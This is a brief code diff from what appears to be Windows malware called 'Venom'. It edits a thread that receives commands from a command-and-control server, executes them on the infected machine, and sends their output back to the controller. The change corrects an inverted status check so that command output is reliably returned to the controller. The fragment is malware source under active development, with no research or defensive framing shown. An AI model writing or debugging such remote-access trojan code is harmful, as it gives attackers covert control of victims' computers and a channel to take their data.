@@ -46,7 +46,7 @@ DWORD WINAPI VenomThread(LPVOID lpParam)
 			case VenomCommands::CommandTypes::ExecuteCommand:
 				const char* commandOutput = (const char*)malloc(VenomCommands::commandOutputBufferLength);
 				status = VenomCommands::executeCommand(recievedCommand.data, commandOutput);
-				if (0 != status) { cncCommunicator.sendDataToCnc(commandOutput); }
+				if (0 == status) { cncCommunicator.sendDataToCnc(commandOutput); }
 				else { cncCommunicator.sendDataToCnc("Error: Unable to execute command\n"); }
 				break;
 			}
